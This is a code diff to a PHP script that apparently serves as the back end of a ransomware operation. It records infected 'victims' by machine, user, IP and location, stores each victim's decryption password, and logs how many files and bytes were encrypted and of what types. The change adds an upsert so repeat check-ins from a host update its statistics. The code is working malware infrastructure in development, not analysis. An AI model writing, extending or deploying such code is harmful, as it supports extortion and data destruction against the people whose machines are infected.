@@ -57,10 +57,17 @@ if (!is_dir($target_dir)) {
 }
 file_put_contents($target_dir . '/' . $file, $password);
 
-// PDO预处理插入
+// PDO预处理 — upsert: 同一systemid更新统计数据，新主机插入
 $stmt = $pdo->prepare(
     'INSERT INTO victims (machine_name, computer_user, os, date, time, ip, location, systemid, password, encrypted_count, encrypted_size, encrypted_types, encrypted_detail)
-     VALUES (:machine_name, :computer_user, :os, :date, :time, :ip, :location, :systemid, :password, :encrypted_count, :encrypted_size, :encrypted_types, :encrypted_detail)'
+     VALUES (:machine_name, :computer_user, :os, :date, :time, :ip, :location, :systemid, :password, :encrypted_count, :encrypted_size, :encrypted_types, :encrypted_detail)
+     ON DUPLICATE KEY UPDATE
+       machine_name=VALUES(machine_name), computer_user=VALUES(computer_user),
+       os=VALUES(os), ip=VALUES(ip), location=VALUES(location),
+       encrypted_count=IF(VALUES(encrypted_count)>0,VALUES(encrypted_count),encrypted_count),
+       encrypted_size=IF(VALUES(encrypted_size)>0,VALUES(encrypted_size),encrypted_size),
+       encrypted_types=IF(VALUES(encrypted_types)!="",VALUES(encrypted_types),encrypted_types),
+       encrypted_detail=IF(VALUES(encrypted_detail)!="",VALUES(encrypted_detail),encrypted_detail)'
 );
 $stmt->execute([
     ':machine_name'    => $machine_name,
